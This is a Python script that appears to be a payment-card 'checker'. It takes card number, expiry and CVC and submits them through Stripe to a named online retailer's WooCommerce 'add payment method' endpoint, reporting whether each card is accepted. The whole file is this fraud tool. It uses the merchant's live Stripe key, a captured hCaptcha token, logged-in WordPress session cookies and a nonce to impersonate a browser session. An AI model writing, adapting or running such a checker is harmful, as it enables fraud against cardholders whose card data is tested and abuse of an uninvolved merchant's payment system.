import requests,re
from bs4 import BeautifulSoup
import time
def Tele1(ccx):
    import requests
    ccx=ccx.strip()
    n = ccx.split("|")[0]
    mm = ccx.split("|")[1]
    yy = ccx.split("|")[2]
    cvc = ccx.split("|")[3]
    if "20" in yy:#Mo3gza
        yy = yy.split("20")[1]
    r = requests.session()
    import requests

    headers = {
        'accept': 'application/json',
        'accept-language': 'en-US,en;q=0.9,ar;q=0.8',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://js.stripe.com',
        'priority': 'u=1, i',
        'referer': 'https://js.stripe.com/',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Linux"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
    }

    data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_year]={yy}&card[exp_month]={mm}&allow_redisplay=unspecified&billing_details[address][country]=EG&pasted_fields=number&payment_user_agent=stripe.js%2Fc710570bc1%3B+stripe-js-v3%2Fc710570bc1%3B+payment-element%3B+deferred-intent&referrer=https%3A%2F%2Fmgbeautyconcept.ca&time_on_page=184618&client_attribution_metadata[client_session_id]=66020d36-8026-4c90-9fce-2f21eaffb73f&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=payment-element&client_attribution_metadata[merchant_integration_version]=2021&client_attribution_metadata[payment_intent_creation_flow]=deferred&client_attribution_metadata[payment_method_selection_flow]=merchant_specified&guid=fac9312b-0f68-4777-9a93-7790c3db881fd93853&muid=1f53de03-a9a9-4547-8b63-e3de963c4845d37f06&sid=ca04c141-0129-4108-b48c-2063706f6d41343f63&key=pk_live_51Jl1gYDP1AP20tUlzabDjFzlAyM5fph3tttSj0yejJpu3eOwQIe2xVXEQdy1OnCn1k9EGYew5pGf5XFSiaAwZwkw00qZDZWmOl&radar_options[hcaptcha_token]=P1_eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJwYXNza2V5IjoiRFBia2ZTWDA5MG42aE1XYjdGaGxJNnlobmF6cDR4Qm1JK0d2cHRLY001T2R2cHoyNzdqdXpoS0I1OEFOYnFDUlZhT0FCLzllYXpXR0hYajZjSDl1QkdCWGlGWUVaSFNyc2t1MjJwaS9IcE9US0VsUyt0N0RjcDBZVUw1RWN2UjVRczN6K3M2Vk92YU4wRFM0ZXBvTUI5bk5mS3BoTS8xWFFwY3JFbUNKS1dFaWNPT2FqWUI2eXV2dXdQaEtJOHpCU1FyUkVBMWpZWGtJS0dESGVNQ09jTE92SXIzcUR2MWVFdy9pNXExWk1ZK25jWHdQeTRiWXdya1Ezd3VFSnEzYjU0VVN6OGlRamtaTjZ6U3ZTL3FYWjBBREsweE9sNDBiZGl1eXNCN0IxWDh5eEttRUk0c20rdk5UYVEvVDhLT25vSUd4emRJZHR0bWN4bTdWZVV5d0VsRlM2WmcxTzF5YWtZYUQrYk5JNXM1RExwb2ROSjlzODRhQjVHMFNZU2ZsRVk0THJiWmV0WndVMm5WMGNjekdSczd5ZGJXZGpUQUxlbGZyVW0rdUFRdHU3Q3pXRndLRFBYenNWb1MrajNzMjhxQUJVNkh0TnFLMGpNMXRVWnpZK3ArcGhFQ2wvRU0vUXR1UFdKV1BDeWx0TlBGNC9xcUtQNnNKVHpDazZXUnZTOE1VRDlkeDFwaGtScktuYnBPWWN6SElmTG0yNkVFRGlmM0tkYWFoaWRha3NabW5QajZzM1lJaEErYXU3U24zblh5MzM5NnQxZXJmQXFtWTFuZlAyZlRXazhOTjI2TlBOejNqa2trei9iSVlza1VnRTdSZ2lLS0JoSEZ5NGlYQTZsYmMyeUhrbm42N2dUSzQzaDRsVGFYMFBiVi9hWlBJd2U0RHBrR1Y2YXFuNUpoenJZRXZLUGYrMmszdjRKdXJEZGI2YnlxSnIySElYSFZ5K3c1OFdzTlhscW44YjFSWHFpUzN6cXU1QWN0SXpvTldDcDkzQUViUWlDcHJ3M1VsWnhnejgweXQ2YnFmalI2dllVMWFqNXNYem5ManVZaU9KNTVsTjQzL2R1cEl0Q3ByaXVnazdSZFl0NzQ0dlRPK0xjY3NYYnVZZUtoVkNNdFUyQituWlcyRk1FWFl1aUt6SDUwN0kybmZuU1JGRTI0NnpEUW9DUXhCUFE2SDg0a2V0WmdNVThUVjNVRlQ5aHBiWS9ZYUJoc25LNk1pTlExNVlvV3hnL3lWV0tCaDc3SzlqR0xxNWxIaXhOZDl0TTkyWHZGSHVzeGp2aDJYRWlMTTRZNFNOelFVeWVmUWdxRGl0WG50L3NiTlJ2am1hWHJpczR6akxIQ29VRHBhVjVseDJtOFdUSnNxcEx2bnlXNjZpZmJkN2JJOXp6YlIrRGFpNmZ5WEVKTitIaHZxVkJGR1dZMVIzS1lsRCtXVFBmSGRQUmxGNms1V1Q1V05kYlhLVDNpUlZWbzhTR1JPVzFHU2IzQ1BIbStkcUZKczgyODdCSWRoRlRnUm81S1FIZlphMHhGK1lzenZlOTYybVdUaXlJY1NuTDlTN0hacXFBeEZrTDJuekZwNHJpY25jZ1ZPL0xMeGdqeWRETTBPYWVLYkFHam9UTGFrRDhQOUIweUlWZXR0aG5OZTl4T3gyaUZ2NW4zZDlFRmVtbXR4cGFkL2JrTjNNR3VzL3ZSZmlPUnFZZENtNVhsdzd2V1FZMTdXVm00bzE1d3JBQ1NaSG9YY3pWY0R3ZUsrcHJiVjBSVDc5SzRCdGNUR2JXNGs4WG5XNGU5WDlER3owTHJXY2tjMmNQWTA4R2ZSWVVKZk1KRGNxRG1xZXRqTThSNWlaUEdhWmgvRS9ac1hKWVBZM0RLaUhoWHBEYWcyK1BCck9VQnI1U09BTmZSV0QzWkhzajViSVEyc0VOZlJCU2prMkVCRjhoa2d5MzF3cTBHR1hqbnhwTEtXQzF5VFNqOHFCdnlyT2FQalNJM1J3ZGl1dGtWY1hjYnhLYkFTVEtDb2d1RUx2UEhaWWFLcXJqUlV3anF2ZEVaK2NscGNrSWU4Z2pFbitjNVFldWVhWVFKZTZiaFJNYTBBQlZHVUJDSHlGOFJkdW1FT3dZbU41WVZsZnYxVEo4c1R3bTg4UjZsZkdUZ1J4QzNWUTRiSXcvYjhDR1ZuWGJBNWNjcTNtVUo0ck9YWVhLS0FaN2JWcjBlWmNSc2IrVkxINFVDTnM4b1Q0d2lOK2VZcXdObWVDVWFsWGRSM3hKcmE5WjlHVDBCR0ZDZkhJWUJHbGdLMTBKTVhpWWd6UWtPVWpuR20xbjhxOWs3L0hMRUZPdEhuc05DT21KOHZCZXh4bjVURHl2MnNLUExieCtwYks2U2Y2UVRqL0RhNnlocUpVQnp1TXltMldKMERPZk9IV3N3cm9XTXUrZ2VvSG1iVndSZ2w4Y3U0eXl6bEQ0dDZCZ1ZqNnlhQzFTdnJkaWUyTFhwV3VNY2xKNGZva1lhdm5FelBRNm1VVXdTL3d4T2lPekwvM2k1N0VEM0V4T1NmaXhMdFVDaHUvckEzWUFneU9GTHhPM3dRNXovK3h1bXB1TGZCQVNBMVJnNlRDbzk2RlMyRFE0bHJseFBEcmYxd1o3RVh4L2hwM1ZTaU5ieVFJSThEYTFoM3N6UXJ6Tk13Yi85RGVLUk5JYnhwQjdWclRaVG9scGJtdWE0cUg4VnlyRm9jTXhZOVB2VnE3TWYzbGhtMzVSZ0d2YnBydjN5NFZrVi9BbW5kSU44dXExSm53RVJmeUZLWHE4d244NEJFV0RadjhvdDdpY2hEdzhXNEZDNlA4eDVFNVBna2JyQU5USU5aTDJpUnVsR3dIMjFEbEJBQitGbU9oWTBtQjUwZnlQaGJReE1UbklwUytYcjRFNVVPWHIxK3JKOWVhR0dNVmFsenJkMi9uenQ4OTk5WTNmMlF0TENHWXdvazRtUFhZQT09IiwiZXhwIjoxNzI1NTg3MzA0LCJzaGFyZF9pZCI6NTM1NzY1NTksImtyIjoiMWZmY2YwZmQiLCJwZCI6MCwiY2RhdGEiOiJkYk9KendLbHNPcnpWcXV1dWdvM2N4TGVOMVZkNE1xS29sRXQyWFd0RUtPN21FdWIwanZqVmtrVXpxWTRZZ2p2elJXL3haSUJWSUNEWEo1SURrOUhVQWJ4aFQvUXJ2eFR0NkpIOFcrQnFQZkxLVVJqSTk3RjJOSklYNlZqUG01ZkxOTEdteW45Wk0rK2RyYjZDN0Z1elVlUVNITTdUMXlrNnRlZGJva2lWcFJKQkduWk5LMG9uSVRFTkU0K1I2RTQvZEhsbGZWb1g3NVY0QzJtIn0.bg6tYEqTePAn1IC0zpBNZug5hsZYo-wWm20z22fEwhA'

    response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
    try:
        tome = (response.json()['id'])
    except:
        pass
    import requests

    cookies = {
        'sbjs_migrations': '1418474375998%3D1',
        'sbjs_current_add': 'fd%3D2024-09-05%2008%3A16%3A44%7C%7C%7Cep%3Dhttps%3A%2F%2Fmgbeautyconcept.ca%2Fmy-account%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fweb.telegram.org%2F',
        'sbjs_first_add': 'fd%3D2024-09-05%2008%3A16%3A44%7C%7C%7Cep%3Dhttps%3A%2F%2Fmgbeautyconcept.ca%2Fmy-account%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fweb.telegram.org%2F',
        'sbjs_current': 'typ%3Dreferral%7C%7C%7Csrc%3Dweb.telegram.org%7C%7C%7Cmdm%3Dreferral%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%2F%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
        'sbjs_first': 'typ%3Dreferral%7C%7C%7Csrc%3Dweb.telegram.org%7C%7C%7Cmdm%3Dreferral%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%2F%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
        'wordpress_logged_in_3e6bdd864a0ee940a1b2726c08cda6ee': 'xodisox675%7C1726735545%7CEwAJoQBYvDpKeCMnvXqAYmQwZUQ9qQZGxEdLz1EqJkz%7C500640bc349e9d252efa6769d38ecec1ab57f7e8da60670a8b1448aa105bff6b',
        '__stripe_mid': '1f53de03-a9a9-4547-8b63-e3de963c4845d37f06',
        'mfn-gdpr': '1',
        'sbjs_udata': 'vst%3D2%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28X11%3B%20Linux%20x86_64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F126.0.0.0%20Safari%2F537.36',
        'sbjs_session': 'pgs%3D1%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fmgbeautyconcept.ca%2Fmy-account%2Fadd-payment-method%2F',
        '__stripe_sid': 'ca04c141-0129-4108-b48c-2063706f6d41343f63',
    }

    headers = {
        'accept': '*/*',
        'accept-language': 'en-US,en;q=0.9,ar;q=0.8',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        # 'cookie': 'sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2024-09-05%2008%3A16%3A44%7C%7C%7Cep%3Dhttps%3A%2F%2Fmgbeautyconcept.ca%2Fmy-account%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fweb.telegram.org%2F; sbjs_first_add=fd%3D2024-09-05%2008%3A16%3A44%7C%7C%7Cep%3Dhttps%3A%2F%2Fmgbeautyconcept.ca%2Fmy-account%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fweb.telegram.org%2F; sbjs_current=typ%3Dreferral%7C%7C%7Csrc%3Dweb.telegram.org%7C%7C%7Cmdm%3Dreferral%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%2F%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dreferral%7C%7C%7Csrc%3Dweb.telegram.org%7C%7C%7Cmdm%3Dreferral%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%2F%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; wordpress_logged_in_3e6bdd864a0ee940a1b2726c08cda6ee=xodisox675%7C1726735545%7CEwAJoQBYvDpKeCMnvXqAYmQwZUQ9qQZGxEdLz1EqJkz%7C500640bc349e9d252efa6769d38ecec1ab57f7e8da60670a8b1448aa105bff6b; __stripe_mid=1f53de03-a9a9-4547-8b63-e3de963c4845d37f06; mfn-gdpr=1; sbjs_udata=vst%3D2%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28X11%3B%20Linux%20x86_64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F126.0.0.0%20Safari%2F537.36; sbjs_session=pgs%3D1%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fmgbeautyconcept.ca%2Fmy-account%2Fadd-payment-method%2F; __stripe_sid=ca04c141-0129-4108-b48c-2063706f6d41343f63',
        'origin': 'https://mgbeautyconcept.ca',
        'priority': 'u=1, i',
        'referer': 'https://mgbeautyconcept.ca/my-account/add-payment-method/',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Linux"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
        'x-requested-with': 'XMLHttpRequest',
    }

    params = {
        'wc-ajax': 'wc_stripe_create_and_confirm_setup_intent',
    }

    data = {
        'action': 'create_and_confirm_setup_intent',
        'wc-stripe-payment-method':tome,
        'wc-stripe-payment-type': 'card',
        '_ajax_nonce': '1588635d20',
    }

    response = requests.post('https://mgbeautyconcept.ca/', params=params, cookies=cookies, headers=headers, data=data)
    msg = response.json()

    if 'error' in msg.get('data', {}) and 'message' in msg['data']['error']:
        
        message = msg['data']['error']['message']

        return message

    elif 'succeeded' in msg.get('data', {}).get('status', ''):

        return 'Card added successfully'
        
    else:

        return msg
